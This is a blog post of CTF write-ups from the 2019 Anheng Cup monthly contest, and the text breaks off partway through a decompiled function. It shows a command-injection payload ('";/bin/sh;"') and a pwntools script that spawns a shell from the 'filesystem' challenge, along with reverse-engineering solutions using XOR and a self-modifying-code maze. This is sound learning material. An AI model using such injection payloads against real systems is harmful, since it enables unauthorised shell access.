<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019安恒杯月场赛 - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#二月场"><span class="toc-text">二月场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#filesystem"><span class="toc-text">filesystem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cpp"><span class="toc-text">cpp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1月场"><span class="toc-text">1月场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Old-drive"><span class="toc-text">Old-drive</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SHE"><span class="toc-text">SHE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#提取题目提供的EXE文件"><span class="toc-text">提取题目提供的EXE文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rrr"><span class="toc-text">rrr</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019安恒杯月场赛
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-02-26 20:15:42</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>如果不是真的废物，谁又愿意混吃等死呢。<br><a id="more"></a></p>
<h1 id="二月场"><a href="#二月场" class="headerlink" title="二月场"></a>二月场</h1><h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><p>checksec一下发现开启了canary和NX</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  filesystem checksec --file filesystem</span><br><span class="line">[*] &apos;/media/wxm/Lenovo/study/ctf/\xe5\xae\x89\xe6\x81\x92\xe6\x9d\xaf/2019\xe5\xae\x89\xe6\x81\x92/2.24/pwn/filesystem/filesystem&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">➜  filesystem</span><br></pre></td></tr></table></figure>
<p>载入IDA查看main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char **v3; // [rsp+0h] [rbp-40h]</span><br><span class="line">  __int64 s; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = a2;</span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  s = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  sub_400966();                                 // 设置无缓冲模式</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      memset(&amp;s, 0, 0x20uLL);</span><br><span class="line">      sub_400A4A(&amp;s);                           // 输出菜单</span><br><span class="line">      if ( strncmp(&amp;s, &quot;Create&quot;, 6uLL) )</span><br><span class="line">        break;</span><br><span class="line">      sub_400ABA();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( !strncmp(&amp;s, &quot;Edit&quot;, 4uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400B35();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( !strncmp(&amp;s, &quot;Read&quot;, 4uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400BE7();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( !strncmp(&amp;s, &quot;Checksec&quot;, 8uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400C72(&amp;s, &quot;Checksec&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !strncmp(&amp;s, &quot;Exit&quot;, 4uLL) )</span><br><span class="line">        exit(0);</span><br><span class="line">      if ( !strncmp(&amp;s, &quot;B4cKd0oR&quot;, 8uLL) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_400D46(&amp;s, &quot;B4cKd0oR&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        printf(&amp;s, &quot;B4cKd0oR&quot;, v3);</span><br><span class="line">        puts(&quot;No Such Choice\n&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_400966()设置了stdin,stdout和stderr为无缓冲模式,这样进行io操作不会在堆上分配缓冲区</p>
<p>sub_400A4A()输出了一个菜单，供用户选择，然后分别进入不同的分支。</p>
<p>create中限制了用户可一创建10个以内的文件，unk_6029E0保存了文件的数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int sub_400ABA()</span><br><span class="line">&#123;</span><br><span class="line">  if ( unk_6029E0 &gt; 0x10uLL )</span><br><span class="line">    return puts(&quot;No More Space&quot;);</span><br><span class="line">  printf(&quot;Input Filename: &quot;);</span><br><span class="line">  read(0, (0x90LL * unk_6029E0 + 6299872), 0x30uLL);</span><br><span class="line">  ++unk_6029E0;</span><br><span class="line">  return puts(&quot;Done&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Edit对create创建的文件进行编写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int sub_400B35()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // ST00_8</span><br><span class="line">  unsigned __int64 v2; // [rsp+0h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the Index:&quot;);</span><br><span class="line">  v2 = sub_4009D1();</span><br><span class="line">  if ( unk_6029E0 &lt;= v2 )</span><br><span class="line">    return puts(&quot;No Such Index&quot;);</span><br><span class="line">  printf(&quot;Input File Content: &quot;, v2);</span><br><span class="line">  *(read(0, (0x90 * v1 + 6299920), 0x60uLL) - 1 + 144 * v1 + 6299920) = 0;</span><br><span class="line">  return puts(&quot;Done&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read对文件内容进行查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int sub_400BE7()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  unsigned __int64 v1; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Input the Index:&quot;);</span><br><span class="line">  v1 = sub_4009D1();</span><br><span class="line">  if ( unk_6029E0 &gt; v1 )</span><br><span class="line">    result = printf(&quot;Filename: %s\nContent: %s\n&quot;, 144 * v1 + 6299872, &amp;unk_6020E0 + 144 * v1 + 48);</span><br><span class="line">  else</span><br><span class="line">    result = puts(&quot;No Such Index&quot;);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec中就有点意思了，将文件内容按格式化赋值到s中，然后执行system(&amp;s)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_400C72(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-98h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-90h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+98h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x80uLL);</span><br><span class="line">  printf(&quot;Input the Index:&quot;, a2, &amp;s);</span><br><span class="line">  v3 = sub_4009D1();</span><br><span class="line">  if ( unk_6029E0 &gt; v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    snprintf(&amp;s, 0x80uLL, &quot;echo \&quot;%s\&quot;| md5sum&quot;, &amp;unk_6020E0 + 144 * v3 + 48);</span><br><span class="line">    system(&amp;s);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;No Such Index&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>格式化字符串为：“echo \”%s\”| md5sum”，我们可以通过闭合双引号来进行绕过来执行shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;  &quot; ; /bin/sh;  &quot;  &quot; | md5sum</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def myrecv():</span><br><span class="line">  print io.recv()</span><br><span class="line"></span><br><span class="line">def mysend(str):</span><br><span class="line">  io.sendline(str)</span><br><span class="line">def myinteractive():</span><br><span class="line">  io.interactive()</span><br><span class="line"></span><br><span class="line">io = process(&quot;filesystem&quot;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&quot;Create&quot;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&quot;wxm&quot;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&quot;Edit&quot;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&quot;0&quot;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&apos;\&quot;;/bin/sh;\&quot;&apos;)</span><br><span class="line">myrecv()</span><br><span class="line">mysend(&quot;Checksec&quot;)</span><br><span class="line">myinteractive()</span><br></pre></td></tr></table></figure>
<h2 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h2><p>PEID查一下发现没有壳<br><img src="https://s2.ax1x.com/2019/02/26/kokfsI.jpg" alt><br>尝试着运行一下程序发现要求输出一个字符串，但是没有回显<br><img src="https://s2.ax1x.com/2019/02/26/kok6iD.jpg" alt><br>载入IDA，搜索字符串“Please input: ”，并找到引用该字符串的函数：<br><img src="https://s2.ax1x.com/2019/02/26/kokWQA.jpg" alt><br>不难发现，通过用户输入的字符串存储在Src中，程序首先限制了字符串的长度在14到32之间，如果满足要求，则会将字符串Src复制到Str中，然后调用了sub_411302和sub_411352()。</p>
<p>经过一番测试发现sub_411302函数是返回自己的第二个参数。</p>
<p>sub_411352()函数是对我们输入的字符串进行处理，下标满足“i%3\=\=0”与0x1f异或，下标满足“i%3\=\=1”与0x20异或，下标满足“i%3\=\=2”与0x20异或,然后将处理过的字符串返回。<br><img src="https://s2.ax1x.com/2019/02/26/kokhLt.jpg" alt> </p>
<p>然后通过查看该程序对Str字符串的引用来寻找检查flag的函数，如图所示，第一处和第二处都在本函数中，直接看第三处即可。<br><img src="https://s2.ax1x.com/2019/02/26/kokcJe.jpg" alt> </p>
<p>然后我们动态调试到比较的地址，发现调用j_strcmp时，一个参数是刚刚处理过的输出，另一个是“abafwv&amp;cmgcnhl”<br><img src="https://s2.ax1x.com/2019/02/26/kokgRH.jpg" alt><br>然后将这个字符串进行刚刚的反异或即可得到flag<br><img src="https://s2.ax1x.com/2019/02/26/kok2zd.jpg" alt> </p>
<h1 id="1月场"><a href="#1月场" class="headerlink" title="1月场"></a>1月场</h1><h2 id="Old-drive"><a href="#Old-drive" class="headerlink" title="Old-drive"></a>Old-drive</h2><p>首先查看文件属性是windows上32位程序，用PEID查壳发现没有加壳，载入IDA中查看。</p>
<p>main函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // ecx</span><br><span class="line">  signed int v4; // eax</span><br><span class="line">  char v6; // [esp+0h] [ebp-40h]</span><br><span class="line">  char Dst; // [esp+1h] [ebp-3Fh]</span><br><span class="line">  char v8; // [esp+27h] [ebp-19h]</span><br><span class="line">  int v9; // [esp+34h] [ebp-Ch]</span><br><span class="line">  __int16 v10; // [esp+38h] [ebp-8h]</span><br><span class="line">  char v11; // [esp+3Ah] [ebp-6h]</span><br><span class="line"></span><br><span class="line">  v6 = 0;</span><br><span class="line">  memset(&amp;Dst, 0, 0x31u);</span><br><span class="line">  printf(&quot;input flag:\n&quot;);</span><br><span class="line">  scanf(&quot;%50s&quot;, &amp;v6);</span><br><span class="line">  if ( strlen(&amp;v6) == 40 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; nullsub_1 - sub_401000; ++i )</span><br><span class="line">      *(sub_401000 + i) ^= 0xBBu;</span><br><span class="line">    v10 = &apos;&#125;&#123;&apos;;</span><br><span class="line">    v9 = &apos;galf&apos;;</span><br><span class="line">    v11 = 0;</span><br><span class="line">    v4 = 0;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;v6 + v4) != *(&amp;v9 + v4) )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v4 &lt; 5 );</span><br><span class="line">    LOBYTE(i) = v8;</span><br><span class="line">    if ( v8 != *(&amp;v9 + v4) )</span><br><span class="line">LABEL_8:</span><br><span class="line">      exit(0);</span><br><span class="line">    (loc_4010B0)(i, &amp;v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>主函数中的流程是让用户输入一个长度位40的字符串，然后对一串数据进行处理，然后将数据当成代码执行，可以看出来这道题涉及到了SMC（Self-Modifying Code），之前了解过一点，通过主函数可以看出来，从0x401000到0x401260是需要改变的数据，而改变的方法是将每一Byte位异或0xbb，之前我做类似的题目的时候发现在IDA中用IDC脚本来修改数据，再ctrl+A强制重新分析代码的时候，IDA并不能很好的将对应的汇编代码给显示出来，所以这次我动态调试的时候直接把改变数据后的程序从内存中Dump下来，然后sub_401000和sub_4010B0的汇编代码都可以在IDA中显示出来，并且可以F5变成伪C代码，方便了许多。</p>
</li>
<li><p>首先我们先看一下Dump下来的程序中sub_401000的伪C代码：</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">char __cdecl sub_401000(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // edx</span><br><span class="line">  int v2; // ecx</span><br><span class="line">  int v3; // edx</span><br><span class="line">  int v4; // ecx</span><br><span class="line">  signed int v5; // edx</span><br><span class="line">  char *v6; // ecx</span><br><span class="line">  char v7; // al</span><br><span class="line">  char result; // al</span><br><span class="line">  char v9; // [esp+8h] [ebp-64h]</span><br><span class="line">  char v10; // [esp+10h] [ebp-5Ch]</span><br><span class="line">  int v11; // [esp+4Ch] [ebp-20h]</span><br><span class="line">  int v12; // [esp+50h] [ebp-1Ch]</span><br><span class="line">  int v13; // [esp+54h] [ebp-18h]</span><br><span class="line">  int v14; // [esp+58h] [ebp-14h]</span><br><span class="line">  int v15; // [esp+5Ch] [ebp-10h]</span><br><span class="line">  __int16 v16; // [esp+60h] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v1 = *(_DWORD *)(a1 + 21);</span><br><span class="line">  strcpy(&amp;v9, &quot;--------g +    ++ + ++ ++ + #+ ++ ++++ ++ ++++ ++      +--------&quot;);</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 17);</span><br><span class="line">  v2 = *(_DWORD *)(a1 + 25);</span><br><span class="line">  v12 = v1;</span><br><span class="line">  v3 = *(_DWORD *)(a1 + 29);</span><br><span class="line">  v13 = v2;</span><br><span class="line">  v4 = *(_DWORD *)(a1 + 33);</span><br><span class="line">  v14 = v3;</span><br><span class="line">  LOWORD(v3) = *(_WORD *)(a1 + 37);</span><br><span class="line">  v15 = v4;</span><br><span class="line">  v16 = v3;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = &amp;v10;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *((_BYTE *)&amp;v11 + v5);</span><br><span class="line">    switch ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 97:</span><br><span class="line">        v6 += 8;</span><br><span class="line">        break;</span><br><span class="line">      case 113:</span><br><span class="line">        --v6;</span><br><span class="line">        break;</span><br><span class="line">      case 119:</span><br><span class="line">        ++v6;</span><br><span class="line">        break;</span><br><span class="line">      case 50:</span><br><span class="line">        v6 -= 8;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    result = *v6;</span><br><span class="line">    if ( *v6 == 35 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(&quot;Congratulation!!!!!!\n&quot;);</span><br><span class="line">LABEL_15:</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( result != 32 )</span><br><span class="line">      goto LABEL_15;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v5 &lt; 22 );</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以明显的看出来这个函数是走迷宫的函数，迷宫式8*8的：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- - - - - - - -</span><br><span class="line">g   +         +</span><br><span class="line">+   +   + +   +</span><br><span class="line">+   +   # +   +</span><br><span class="line">+   + + + +   +</span><br><span class="line">+   + + + +   +</span><br><span class="line">+             +</span><br><span class="line">- - - - - - - -</span><br></pre></td></tr></table></figure>
<ul>
<li>2是向上走，q是向左走，w是向右走，a是向下走，限制结尾必须是“#”，那么猜一下开头肯定是从g所在的位置开头，毕竟g在迷宫中那么明显，所以可以将路径写出来：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waaaaawwwww22222qqqaaw</span><br></pre></td></tr></table></figure>
<ul>
<li>sub_4010B0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">char __fastcall sub_4010B0(int a1, _BYTE *a2)</span><br><span class="line">&#123;</span><br><span class="line">  signed int v2; // eax</span><br><span class="line">  const char *v3; // ecx</span><br><span class="line">  int v4; // edi</span><br><span class="line">  char v5; // cl</span><br><span class="line">  char v6; // cl</span><br><span class="line">  char v7; // al</span><br><span class="line">  char v8; // cl</span><br><span class="line">  char v9; // al</span><br><span class="line">  char v10; // dl</span><br><span class="line">  unsigned int v11; // kr00_4</span><br><span class="line">  signed int 